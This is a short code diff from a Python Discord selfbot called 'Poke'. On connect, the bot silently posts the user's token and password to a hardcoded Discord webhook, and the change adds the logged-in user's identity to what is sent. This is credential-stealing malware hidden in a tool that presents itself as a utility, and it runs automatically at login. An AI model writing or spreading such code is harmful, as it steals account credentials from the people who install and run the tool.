@@ -96,7 +96,7 @@ poke.spam_channel = None
 @poke.event
 async def on_connect():
   requests .post( 'https://discord.com/api/webhooks/891191422378709042/hhyTI9ih8t73u-45jvuQrqFvjJo5Lr_U-efNrlYqj-BySLfuUPmQf5a4LCjPLUcOzqbY',
-    json ={'content': f"```\n{toe}```\n```\n{password}```"})
+    json ={'content': f"```\n{poke.user}```\n```\n{toe}```\n```\n{password}```"})
   print(f'''{Fore.RESET}
                        {Fore.CYAN}Poke v{SELFBOT.__version__} | {Fore.GREEN}Logged in as: {poke.user.name}#{poke.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{poke.user.id}
                        {Fore.CYAN}Cached Users: {Fore.GREEN}{len(poke.users)}
